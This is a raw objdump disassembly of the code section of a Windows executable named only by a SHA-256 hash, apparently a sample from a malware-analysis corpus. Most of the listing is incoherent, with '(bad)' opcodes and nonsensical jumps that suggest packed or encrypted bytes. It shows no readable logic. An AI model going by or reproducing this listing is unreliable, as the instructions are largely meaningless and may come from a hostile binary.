
3b3f421cee870d2c3615a30bb5cb4375ee0706507d3426746eb53f8ee1e89b31.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	call   0x8d6880
  401009:	add    BYTE PTR [eax],al
  40100b:	add    BYTE PTR [edx],al
  40100d:	add    BYTE PTR [eax],al
  40100f:	add    BYTE PTR [ebp+0x0],cl
  401012:	add    BYTE PTR [eax],al
  401014:	add    al,ah
  401016:	add    BYTE PTR [eax],al
  401018:	add    BYTE PTR [esi+0x554d0000],ah
  40101e:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  401024:	mov    esp,ebp
  401026:	or     ah,dh
  401028:	dec    ebp
  401029:	add    bh,al
  40102b:	add    BYTE PTR [eax],cl
  40102d:	add    BYTE PTR [eax],al
  40102f:	mov    DWORD PTR [eax],0x40f44545
  401035:	cmp    BYTE PTR [eax],al
  401037:	test   DWORD PTR [ebx-0x34070b64],ecx
  40103d:	(bad)  
  40103e:	enter  0x4d45,0xbc
  401042:	mov    edi,DWORD PTR [ebx]
  401044:	hlt    
  401045:	test   ebx,ecx
  401047:	pushf  
  401048:	enter  0x4df8,0x8b
  40104c:	mov    DWORD PTR [ebp-0x20],0x890208
  401053:	inc    ebp
  401054:	inc    ebp
  401055:	cld    
  401056:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40105c:	or     BYTE PTR [ebx+0x0],dl
  40105f:	mov    ebx,0x8bd5900
  401064:	call   DWORD PTR [ecx-0x1]
  401067:	pop    es
  401068:	mov    ch,0x33
  40106a:	dec    ebx
  40106c:	(bad)  
  40106d:	mov    eax,0x72009fa4
  401072:	push   DWORD PTR [edx]
  401074:	or     BYTE PTR [eax],al
  401076:	jmp    0xff89:0x75c84d03
  40107d:	dec    ebp
  40107e:	loopne 0x401050
  401080:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  401086:	add    BYTE PTR [ebx],dh
  401088:	mov    ecx,ebx
  40108a:	hlt    
  40108b:	add    ecx,ebx
  40108d:	enter  0x899f,0x32
  401091:	dec    ebp
  401092:	add    ecx,eax
  401094:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40109a:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4010a1:	xor    ecx,ebx
  4010a3:	retf   
  4010a4:	enter  0x4d03,0xc8
  4010a8:	mov    DWORD PTR fs:[eax],ebx
  4010ab:	lea    eax,[eax]
  4010ad:	push   esp
  4010ae:	mov    edi,edi
  4010b0:	fs (bad) 
  4010b2:	(bad)  
  4010b3:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4010b9:	push   0xffffffff
  4010bb:	and    bh,bh
  4010bd:	pop    ecx
  4010be:	inc    eax
  4010bf:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4010c5:	push   0xffffff8b
  4010c7:	pop    ecx
  4010c8:	cld    
  4010c9:	dec    ebp
  4010ca:	lea    ecx,[ecx+0x45ff08ff]
  4010d0:	mov    BYTE PTR [edx+0x1],cl
  4010d3:	add    BYTE PTR [eax],al
  4010d5:	mov    DWORD PTR [ebp+0x8],0x58008d
  4010dc:	dec    DWORD PTR [ebp-0x77]
  4010df:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4010e6:	cld    
  4010e7:	dec    ebp
  4010e8:	jne    0x40111d
  4010ea:	lea    eax,[ebx]
  4010ec:	push   eax
  4010ed:	mov    edi,edi
  4010ef:	or     BYTE PTR [ecx+0x54a845],cl
  4010f5:	add    al,ch
  4010f7:	(bad)  
  4010f8:	sub    ebp,esp
  4010fa:	add    BYTE PTR [eax],al
  4010fc:	rol    BYTE PTR [eax],0x84
  4010ff:	inc    ebp
  401100:	add    dh,BYTE PTR [esi+0x0]
  401103:	add    BYTE PTR [ebp-0x73],al
  401106:	mov    ebp,DWORD PTR [esp+edx*4]
  401109:	inc    DWORD PTR [eax]
  40110b:	lea    ecx,[ebx-0x30074f4]
  401111:	call   0x411c96
  401116:	add    BYTE PTR [ebp+0x0],cl
  401119:	jne    0x40115c
  40111b:	dec    DWORD PTR [ebx-0x76210314]
  401121:	dec    ebp
  401122:	add    DWORD PTR [ebp+0x0],esi
  401125:	(bad)  
  401126:	xchg   ebp,eax
  401127:	loopne 0x401128
  401129:	inc    eax
  40112a:	inc    DWORD PTR [eax]
  40112c:	mov    ecx,DWORD PTR [ebp-0x4]
  40112f:	xor    edx,DWORD PTR [edx+0x7201b8]
  401135:	add    BYTE PTR [edx],dl
  401137:	enter  0x4d90,0x0
  40113b:	mov    eax,DWORD PTR [eax]
  40113d:	hlt    
  40113e:	add    al,0xa5
  401140:	mov    al,0xff
  401142:	add    bh,bh
  401144:	add    BYTE PTR [ebx],dh
  401146:	inc    DWORD PTR [ebx]
  401148:	sbb    al,0x89
  40114a:	jne    0x401124
  40114c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  401152:	mov    eax,DWORD PTR [ebp-0xff0048]
  401158:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40115f:	inc    DWORD PTR [ebp-0x75]
  401162:	fisttp QWORD PTR [esi+ebp*8]
  401165:	test   DWORD PTR [esi-0x1],esp
  401168:	inc    ebp
  401169:	(bad)  
  40116a:	aas    
  40116b:	inc    ebp
  40116c:	(bad)  
  40116d:	lea    edi,[esp+eiz*2-0x1]
  401171:	push   DWORD PTR [edi]
  401173:	mov    DWORD PTR ds:0x8000c7a0,edi
  401179:	mov    ebp,esp
  40117b:	cld    
  40117c:	jmp    0xdfff:0xeeff458d
  401183:	mov    bh,al
  401185:	add    DWORD PTR [eax-0x13ba1500],ecx
  40118b:	inc    DWORD PTR [ebp-0x4]
  40118e:	xlat   BYTE PTR ds:[ebx]
  40118f:	lea    edi,[edi]
  401191:	inc    edi
  401193:	jmp    FWORD PTR [eax-0x78]
  401196:	inc    DWORD PTR [ecx]
  401198:	aaa    
  401199:	add    BYTE PTR ds:0x6c00c757,bh
  40119f:	test   edi,edi
  4011a1:	pandn  mm0,mm5
  4011a4:	aas    
  4011a5:	add    bh,al
  4011a7:	mov    esi,DWORD PTR [eax-0x4]
  4011aa:	inc    DWORD PTR [eax+0xdf01ee]
  4011b0:	(bad)  
  4011b1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4011b5:	mov    esp,ebx
  4011b7:	xchg   esp,eax
  4011b8:	rol    DWORD PTR [eax],cl
  4011ba:	(bad)  
  4011bb:	mov    edi,DWORD PTR [eax+0x3]
  4011be:	(bad)  
  4011bf:	cmp    al,0xd7
  4011c1:	dec    ebp
  4011c2:	ror    DWORD PTR [ebx+0x2ad8e8],0x0
  4011c9:	lea    ecx,[ebx-0x7f0003b4]
  4011cf:	push   edx
  4011d0:	add    DWORD PTR [ebp+0x0],edx
  4011d3:	mov    esi,DWORD PTR [eax]
  4011d5:	mov    WORD PTR [edx+0x0],gs
  4011d8:	add    BYTE PTR [ebx-0x778afc7b],cl
  4011de:	mov    eax,DWORD PTR [eax]
  4011e0:	cld    
  4011e1:	push   0x7d
  4011e3:	dec    DWORD PTR [ebx+0xd88c]
  4011e9:	push   edx
  4011ea:	mov    edx,DWORD PTR [ecx-0x4]
  4011ed:	call   DWORD PTR [eax+0x7d01fc]
  4011f3:	mov    ecx,DWORD PTR [ecx+0x509000fc]
  4011f9:	add    DWORD PTR [esi+0x0],edx
  4011fc:	test   DWORD PTR [ebp+0x75],eax
  4011ff:	jmp    0x947d:0xc7fce28b
  401206:	mov    ebp,ebx
  401208:	fcom   st(7)
  40120a:	add    bh,al
  40120c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  401212:	add    edi,edi
  401214:	add    bh,bh
  401216:	addr16 in eax,dx
  401218:	add    dh,dl
  40121a:	push   eax
  40121b:	inc    ebp
  40121c:	push   esi
  40121d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  401223:	test   BYTE PTR [ebx],dh
  401225:	(bad)  
  401226:	add    eax,0x4572c8
  40122b:	jecxz  0x4011ee
  40122d:	rol    DWORD PTR [edi+eax*8-0x22ff73ff],cl
  401234:	inc    esi
  401235:	jle    0x401237
  401237:	test   edi,eax
  401239:	jmp    esp
  40123b:	inc    DWORD PTR [eax]
  40123d:	in     eax,dx
  40123e:	add    dh,dl
  401240:	jne    0x4011c7
  401242:	mov    edi,edi
  401244:	cld    
  401245:	inc    DWORD PTR [ebp-0x14]
  401248:	mov    ebp,edx
  40124a:	mov    ah,0x85
  40124c:	add    bh,bh
  40124e:	call   0x1163d52
  401253:	enter  0x858b,0xfc
  401257:	inc    DWORD PTR [eax+0xeb01ff]
  40125d:	in     al,dx
  40125e:	xor    BYTE PTR [ebp-0xff0020],al
  401264:	mov    ebx,ebp
  401266:	cld    
  401267:	jle    0x4011f2
  401269:	mov    eax,0x50000001
  40126e:	add    DWORD PTR [ebp+0x45],eax
  401271:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  401277:	dec    DWORD PTR [ebx-0x3fd80318]
  40127d:	add    BYTE PTR [ebp-0xbf0040],dl
  401283:	inc    ebp
  401284:	das    
  401285:	mov    eax,DWORD PTR [eax]
  401287:	cld    
  401288:	push   eax
  401289:	mov    al,0x45
  40128b:	add    DWORD PTR [ebx+0x459c00],ecx
  401291:	mov    edi,edi
  401293:	mov    eax,0xe80800ff
  401298:	inc    ebp
  401299:	sub    cl,BYTE PTR [ebx-0x47000400]
  40129f:	add    al,0x1
  4012a1:	rol    BYTE PTR [eax],0x1e
  4012a4:	jne    0x4012eb
  4012a6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4012ac:	inc    DWORD PTR [ecx]
  4012ae:	call   0x853cb3
  4012b3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4012b9:	call   0x403cbf
  4012be:	xor    bh,bh
  4012c0:	push   edi
  4012c1:	adc    BYTE PTR [ebx-0x747423bb],al
  4012c7:	loopne 0x4012a5
  4012c9:	ret    
  4012ca:	loopne 0x40126b
  4012cc:	xor    DWORD PTR [edx],0x31
  4012cf:	cmp    edi,edi
  4012d1:	bswap  esp
  4012d3:	rol    BYTE PTR gs:[eax],0x5
  4012d7:	jmp    0x12b1421
  4012dc:	mov    eax,DWORD PTR [ebp-0x4]
  4012df:	add    BYTE PTR [eax+0xff0100],bh
  4012e5:	cld    
  4012e6:	jne    0x401365
  4012e8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4012ee:	lds    eax,FWORD PTR [ecx]
  4012f0:	add    BYTE PTR [eax],al
  4012f2:	push   eax
  4012f3:	cs inc ebp
  4012f5:	add    BYTE PTR [ebx+0x459850],cl
  4012fb:	mov    edi,edi
  4012fd:	test   al,0xff
  4012ff:	add    BYTE PTR [eax],cl
  401301:	inc    DWORD PTR [ebp-0x18]
  401304:	jmp    DWORD PTR [esi]
  401306:	fadd   QWORD PTR [eax]
  401308:	jge    0x401357
  40130a:	adc    BYTE PTR [ebx+0x459cb9],cl
  401310:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  401316:	lahf   
  401317:	mov    eax,0x30132
  40131c:	lea    esi,[ebp+0x2c]
  40131f:	xor    edi,edi
  401321:	(bad)  
  401322:	call   0x13f3c8f
  401327:	call   0x1343db7
  40132c:	jne    0x4012b9
  40132e:	xor    edi,esp
  401330:	add    eax,DWORD PTR [eax+0xc018d]
  401336:	push   DWORD PTR [eax]
  401338:	call   0xc93c94
  40133d:	int3   
  40133e:	inc    DWORD PTR [ebp-0x14]
  401341:	mov    ecx,DWORD PTR [ebp-0x28]
  401344:	xor    eax,DWORD PTR [eax]
  401346:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40134c:	(bad)  
  40134d:	xchg   ebp,eax
  40134e:	in     al,0xff
  401350:	add    bh,bh
  401352:	add    BYTE PTR [eax*2+0x8508b00],al
  401359:	inc    ebp
  40135a:	ret    
  40135b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff61]
  401362:	mov    edi,edi
  401364:	or     BYTE PTR [eax],cl
  401366:	inc    ebp
  401367:	test   DWORD PTR gs:[eax],eax
  40136a:	je     0x4013b1
  40136c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  401372:	xor    edx,DWORD PTR [eax-0x73]
  401375:	push   ebp
  401376:	or     BYTE PTR [ebp+0x21007572],al
  40137c:	inc    ebp
  40137d:	in     al,dx
  40137e:	mov    ebp,DWORD PTR [eax]
  401380:	mov    esp,0x618bc345
  401385:	fmul   st,st(5)
  401387:	add    BYTE PTR [ebx],ch
  401389:	mov    eax,DWORD PTR [ebx]
  40138b:	cld    
  40138c:	loopne 0x40134e
  40138e:	inc    ebp
  40138f:	push   ebp
  401390:	cmp    ebp,eax
  401392:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  401399:	cld    
  40139a:	fadd   DWORD PTR [eax+0x3b014d]
  4013a0:	jne    0x4013d2
  4013a2:	push   0xf8898557
  4013a7:	in     al,dx
  4013a8:	jne    0x4013ef
  4013aa:	lea    eax,[ebx+0x72e8dcc8]
  4013b0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4013b6:	jmp    0x4013eb
  4013b8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4013be:	xor    eax,edi
  4013c0:	adc    DWORD PTR [ebp-0xcd0061],0x8b9031
  4013ca:	rcl    BYTE PTR [eax-0x40],1
  4013cd:	inc    ebp
  4013ce:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4013d6:	inc    ebp
  4013d7:	xchg   ebp,eax
  4013d8:	ud0    ebp,DWORD PTR [ebx]
  4013db:	inc    DWORD PTR [eax]
  4013dd:	jp     0x401455
  4013df:	add    BYTE PTR [edx+0x1f558050],cl
  4013e5:	mov    ecx,DWORD PTR [esp+esi*8]
  4013e8:	inc    eax
  4013e9:	retf   
  4013ea:	inc    ebp
  4013eb:	iret   
  4013ec:	jb     0x4013b6
  4013ee:	mov    eax,DWORD PTR [edi]
  4013f0:	enter  0x4545,0x1
  4013f4:	cmp    BYTE PTR [eax],al
  4013f6:	pushf  
  4013f7:	mov    ecx,DWORD PTR [ecx+0x3b4df0bc]
  4013fd:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  401404:	dec    ebp
  401405:	add    BYTE PTR [ebx],dh
  401407:	inc    ebp
  401408:	mov    DWORD PTR [ebx-0x3f601b4c],ecx
  40140e:	xor    dl,BYTE PTR [edx]
  401410:	add    eax,DWORD PTR [ebp-0x77]
  401413:	mov    eax,esp
  401415:	fmul   DWORD PTR [ebp-0x3d]
  401418:	xor    eax,DWORD PTR [ebx+eax*1+0x832899f]
  40141f:	mov    DWORD PTR [ebp-0x28],eax
  401422:	fadd   DWORD PTR [ebp-0x64]
  401425:	xor    eax,edi
  401427:	mov    ecx,0xff858db0
  40142c:	clc    
  40142d:	enter  0x4d45,0x3d
  401431:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  401438:	test   esi,edi
  40143a:	clc    
  40143b:	inc    DWORD PTR [ebp+0x45]
  40143e:	aas    
  40143f:	mov    ebx,DWORD PTR [eax+ecx*1+0x16a8c8c7]
  401446:	test   DWORD PTR [eax],edi
  401448:	clc    
  401449:	pushf  
  40144a:	inc    ebp
  40144b:	push   DWORD PTR [ecx]
  40144d:	cld    
  40144e:	pushf  
  40144f:	inc    ebp
  401450:	mov    edx,DWORD PTR [eax-0x28]
  401453:	ins    DWORD PTR es:[edi],dx
  401454:	push   ebp
  401455:	add    BYTE PTR [ebx],dh
  401457:	mov    DWORD PTR [ebx],eax
  401459:	sar    BYTE PTR [ebx],1
  40145b:	adc    BYTE PTR [edi],cl
  40145d:	dec    ebp
  40145e:	adc    al,0x8b
  401460:	add    al,dl
  401462:	jmp    0x1011632
  401467:	jb     0x4014b6
  401469:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40146f:	xor    ecx,DWORD PTR [ebp+0x3b]
  401472:	xor    ecx,DWORD PTR [edi]
  401474:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  401478:	(bad)  
  40147a:	clc    
  40147b:	enter  0x8400,0x8b
  40147f:	pop    es
  401480:	mov    al,0x0
  401482:	push   ebp
  401483:	push   cs
  401484:	xor    ecx,eax
  401486:	xor    esp,ecx
  401488:	add    ebp,DWORD PTR [eax]
  40148a:	add    esi,DWORD PTR [eax]
  40148c:	(bad)  
  40148e:	retf   0x55c8
  401491:	repnz mov eax,DWORD PTR [ebp-0x10]
  401495:	(bad)  
  401496:	cli    
  401497:	fdivr  st,st(1)
  401499:	test   DWORD PTR [eax+edi*8],ecx
  40149c:	dec    ebp
  40149d:	inc    ebp
  40149e:	xor    edi,DWORD PTR [eax-0x7167afd]
  4014a4:	add    BYTE PTR [ebp+0x0],al
  4014a7:	mov    ecx,DWORD PTR [ebp-0x28]
  4014aa:	mov    ecx,ebx
  4014ac:	clc    
  4014ad:	jne    0x40147a
  4014af:	mov    esi,0xd672d3
  4014b4:	into   
  4014b5:	into   
  4014b6:	scas   eax,DWORD PTR es:[edi]
  4014b7:	dec    ebp
  4014b8:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4014be:	sub    ecx,esi
  4014c0:	cmp    ecx,DWORD PTR [ebp+0x77]
  4014c3:	(bad)  
  4014c4:	mov    edi,eax
  4014c6:	mov    al,0x85
  4014c8:	mov    eax,edi
  4014ca:	add    BYTE PTR [ebp-0x75],al
  4014cd:	cmp    ah,BYTE PTR [esp+ebx*4-0x47cc38ab]
  4014d4:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4014da:	(bad)  
  4014dc:	retf   0x559c
  4014df:	(bad)  
  4014e0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4014e7:	inc    ebp
  4014e8:	add    eax,0xeb9c4d3e
  4014ed:	(bad)  
  4014ee:	mov    ecx,esp
  4014f0:	lods   al,BYTE PTR ds:[esi]
  4014f1:	test   DWORD PTR [ebp-0x8],edx
  4014f4:	xor    ecx,DWORD PTR [ebp+0x33]
  4014f7:	mov    eax,DWORD PTR [ebx]
  4014f9:	lock add ecx,ebx
  4014fc:	bswap  esi
  4014fe:	retf   0x55d1
  401501:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  401507:	jmp    0x401502
  401509:	add    BYTE PTR ds:0xebc44d8b,al
  40150f:	push   ebp
  401510:	mov    ebp,DWORD PTR [ebx]
  401512:	test   al,0x8b
  401514:	push   ebp
  401515:	clc    
  401516:	xor    ecx,ebx
  401518:	xor    ecx,esi
  40151a:	add    edx,ecx
  40151c:	add    eax,DWORD PTR [edx+0xca010f]
  401522:	push   ebp
  401523:	dec    ebp
  401524:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40152a:	stc    
  40152b:	rol    DWORD PTR ds:0xebce4dd6,cl
  401531:	scas   eax,DWORD PTR es:[edi]
  401532:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  401538:	xor    ebp,DWORD PTR [ebx]
  40153a:	xor    edi,DWORD PTR [ebx]
  40153c:	add    esi,DWORD PTR [edi+0x3]
  40153f:	mov    ecx,DWORD PTR [edi]
  401541:	clc    
  401542:	retf   0x55cb
  401545:	into   
  401546:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40154d:	mov    eax,0x3376554d
  401552:	mov    esi,DWORD PTR [ebx]
  401554:	int3   
  401555:	add    edx,DWORD PTR [ebp+0x3]
  401558:	xor    ecx,DWORD PTR [edi]
  40155a:	xor    ecx,edx
  40155c:	add    edx,DWORD PTR [ebp+0x3]
  40155f:	mov    ecx,DWORD PTR [edi]
  401561:	lock retf 0x4dfa
  401565:	stc    
  401566:	mov    ecx,DWORD PTR [eax]
  401568:	or     BYTE PTR [ebp+0x4d],cl
  40156b:	jmp    0x10415fb
  401570:	dec    ebp
  401571:	dec    ebp
  401572:	(bad)  
  401573:	mov    ebx,esp
  401575:	clc    
  401576:	test   ebx,ecx
  401578:	clc    
  401579:	ror    DWORD PTR [ebp-0x2a],cl
  40157c:	mov    esi,ecx
  40157e:	call   0x3acb5b32
  401583:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40158a:	retf   
  40158b:	ja     0x40155b
  40158d:	mov    ebp,DWORD PTR [eax-0x48]
  401590:	dec    ebp
  401591:	xor    ecx,DWORD PTR [di+0x3]
  401595:	mov    esp,esp
  401597:	clc    
  401598:	push   ebp
  401599:	retf   
  40159a:	mov    dl,bl
  40159c:	adc    esi,edx
  40159e:	jb     0x40156e
  4015a0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4015a6:	call   0x4d6be128
  4015ab:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4015b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015b2:	lahf   
  4015b3:	inc    ebp
  4015b4:	xor    cl,BYTE PTR [ebp-0x78]
  4015b7:	mov    edx,edi
  4015b9:	clc    
  4015ba:	dec    ebp
  4015bb:	retf   
  4015bc:	mov    edx,ebx
  4015be:	call   0x560ee999
  4015c3:	scas   eax,DWORD PTR es:[edi]
  4015c4:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4015ca:	lahf   
  4015cb:	sub    esi,DWORD PTR [edx]
  4015cd:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4015d3:	lods   al,BYTE PTR ds:[esi]
  4015d4:	xor    esp,DWORD PTR [ebx]
  4015d6:	add    ecx,DWORD PTR [ebp-0x1c]
  4015d9:	mov    edi,DWORD PTR [ebp-0x8]
  4015dc:	mov    bl,cl
  4015de:	cmp    dl,bl
  4015e0:	jb     0x4015b0
  4015e2:	add    dh,dl
  4015e4:	dec    ebp
  4015e5:	scas   eax,DWORD PTR es:[edi]
  4015e6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  4015ec:	shr    DWORD PTR [ebx],cl
  4015ee:	into   
  4015ef:	cmp    edx,esi
  4015f1:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  4015f7:	dec    ebp
  4015f8:	dec    ebp
  4015f9:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  4015ff:	retf   
  401600:	xor    edx,esi
  401602:	add    ecx,esi
  401604:	imul   ecx,edx
  401607:	mov    DWORD PTR [ebp+0x8],edx
  40160a:	xor    ecx,DWORD PTR [ebp+0x2b]
  40160d:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  401613:	add    esi,DWORD PTR [ebx]
  401615:	mov    ah,0x3
  401617:	inc    ebp
  401618:	(bad)  
  40161b:	pushf  
  40161c:	jge    0x4015a7
  40161e:	xor    ebx,eax
  401620:	sub    eax,DWORD PTR [ebp-0x73]
  401623:	(bad)  
  401624:	cmp    al,al
  401626:	jb     0x4015ad
  401628:	add    al,bh
  40162a:	ror    DWORD PTR [ebp-0x7a],1
  40162d:	xor    edi,edi
  40162f:	add    edi,edi
  401631:	jmp    0x401680
  401633:	mov    ecx,DWORD PTR [ebx-0x34341324]
  401639:	dec    ebp
  40163a:	into   
  40163b:	mov    ebp,DWORD PTR [edi-0x23737428]
  401641:	lahf   
  401642:	shl    DWORD PTR [edx],cl
  401644:	retf   0x5588
  401647:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40164d:	add    eax,DWORD PTR [eax]
  40164f:	in     al,0x4d
  401651:	push   ebp
  401652:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  401658:	popa   
  401659:	add    ch,cl
  40165b:	dec    ebp
  40165c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  401662:	dec    ebp
  401663:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  401669:	jge    0x401639
  40166b:	mov    BYTE PTR [edi+0xf723b3a],ch
  401671:	add    cl,dh
  401673:	dec    ebp
  401674:	dec    DWORD PTR [ebx-0x2c032375]
  40167a:	adc    BYTE PTR [ebp+0x1],0x8b
  40167e:	add    al,bl
  401680:	jge    0x40160e
  401682:	push   0xffffff9f
  401684:	push   0x8b3032
  401689:	shl    BYTE PTR [ebp+0x55],0x6a
  40168d:	xor    edi,edi
  40168f:	xor    edx,DWORD PTR [ebx+eax*1]
  401692:	inc    ebp
  401693:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  401699:	dec    ebp
  40169a:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4016a0:	jbe    0x40162d
  4016a2:	mov    ebp,esp
  4016a4:	ror    bl,1
  4016a6:	enter  0x14ce,0xaf
  4016aa:	dec    DWORD PTR [ebx-0x2cef17f8]
  4016b0:	push   ebp
  4016b1:	retf   0x5540
  4016b4:	push   ebp
  4016b5:	mov    esi,DWORD PTR [edx-0x1c]
  4016b8:	mov    edx,ebx
  4016ba:	cld    
  4016bb:	(bad)  
  4016bc:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4016c3:	sti    
  4016c4:	add    dh,cl
  4016c6:	push   0xffffff94
  4016c8:	call   FWORD PTR [edi+0x3b5032d0]
  4016ce:	mov    ecx,DWORD PTR [edi]
  4016d0:	int3   
  4016d1:	pop    esi
  4016d2:	inc    ebp
  4016d3:	dec    DWORD PTR [ecx+0x45e8c88b]
  4016d9:	push   ebp
  4016da:	xor    esi,DWORD PTR [ebx]
  4016dc:	mov    DWORD PTR [ebx],0xcace0f9c
  4016e2:	aas    
  4016e3:	push   ebp
  4016e4:	inc    ebp
  4016e5:	xor    eax,esi
  4016e7:	add    eax,esi
  4016e9:	mov    eax,DWORD PTR [ebx]
  4016eb:	(bad)  
  4016ec:	jmp    0x40167a
  4016ee:	mov    bl,BYTE PTR [edi-0x7674cdfb]
  4016f4:	rol    ah,1
  4016f6:	mov    esi,0xf133104d
  4016fb:	mov    edx,0xff348d80
  401700:	mov    dh,0xd1
  401702:	cmp    edx,DWORD PTR [ebp+0xf]
  401705:	mov    eax,DWORD PTR [edx-0x20]
  401708:	add    BYTE PTR [ebp-0x75],bh
  40170b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  401712:	lahf   
  401713:	retf   0x8632
  401716:	cmp    ebp,0x8
  401719:	call   ebx
  40171b:	inc    ebp
  40171c:	inc    ebp
  40171d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  401723:	mov    edi,DWORD PTR [eax]
  401725:	enter  0x49c,0xc7
  401729:	add    al,al
  40172b:	add    bl,al
  40172d:	(bad)  
  40172e:	clc    
  40172f:	enter  0x45,0x38
  401733:	push   eax
  401734:	pushf  
  401735:	mov    edi,eax
  401737:	int3   
  401738:	or     al,al
  40173a:	test   DWORD PTR [edi],edi
  40173c:	clc    
  40173d:	gs inc ebp
  40173f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  401745:	push   ss
  401746:	xor    ecx,DWORD PTR [ebp+0x3]
  401749:	sub    edx,DWORD PTR [ecx-0x76]
  40174c:	dec    ebp
  40174d:	add    DWORD PTR [ebx+0x88d845],ecx
  401753:	mov    esi,DWORD PTR [ebx]
  401755:	or     BYTE PTR [ebx],al
  401757:	cmp    edx,DWORD PTR [ecx-0x38]
  40175a:	dec    ebp
  40175b:	out    dx,eax
  40175c:	xor    eax,DWORD PTR [ebp+0x3]
  40175f:	mov    edx,DWORD PTR [ecx-0x28]
  401762:	dec    ebp
  401763:	add    BYTE PTR [ebx],dh
  401765:	push   0x518003
  40176a:	push   eax
  40176b:	add    BYTE PTR [ebx-0x300748b],cl
  401771:	sbb    BYTE PTR [ebp+0x45],cl
  401774:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40177a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  401780:	dec    ebp
  401781:	inc    ebp
  401782:	xor    eax,esi
  401784:	add    eax,esi
  401786:	push   ecx
  401787:	(bad)  
  401788:	dec    ebp
  401789:	mov    al,ds:0x35e03dff
  40178e:	retf   
  40178f:	(bad)  
  401790:	into   
  401791:	sub    bh,bh
  401793:	dec    esp
  401794:	adc    al,0x9c
  401796:	inc    ebp
  401797:	push   ebp
  401798:	test   DWORD PTR [edi],ecx
  40179a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab5ff80]
  4017a1:	jmp    0xc9b926b5
  4017a6:	add    cl,dl
  4017a8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4017b2:	cmp    cl,BYTE PTR [ebp+0x728b089c]
  4017b8:	rol    BYTE PTR [eax],0x59
  4017bb:	clc    
  4017bc:	popa   
  4017bd:	jb     0x4017c6
  4017bf:	mov    eax,DWORD PTR [ebp-0x30]
  4017c2:	xor    al,0x40
  4017c4:	sub    al,0xc7
  4017c6:	mov    ah,ch
  4017c8:	add    DWORD PTR [ebp+0x4534f845],eax
  4017ce:	sub    al,0x89
  4017d0:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4017d7:	mov    ch,0xff
  4017d9:	clc    
  4017da:	add    DWORD PTR [ebp+0x60],0x3c
  4017de:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  4017e5:	inc    ebp
  4017e6:	dec    DWORD PTR [ebx-0x341ff701]
  4017ec:	test   esi,ecx
  4017ee:	dec    DWORD PTR [ebx-0x7f8a3301]
  4017f4:	push   eax
  4017f5:	add    DWORD PTR [ebp+0x0],eax
  4017f8:	dec    ebx
  4017fa:	or     al,0xce
  4017fc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  401803:	into   
  401804:	add    BYTE PTR [ebx-0x34ff1400],cl
  40180a:	mov    esi,ecx
  40180c:	sar    bh,0x45
  40180f:	adc    al,0x8b
  401811:	clc    
  401812:	fadd   DWORD PTR [ebp+0x0]
  401815:	mov    ebp,DWORD PTR [edx+0x8]
  401818:	push   edi
  401819:	adc    BYTE PTR [eax+0x1],0x83
  40181d:	add    al,al
  40181f:	retf   
  401820:	mov    ecx,esi
  401822:	cld    
  401823:	mov    eax,DWORD PTR [eax+0xcb01cc]
  401829:	into   
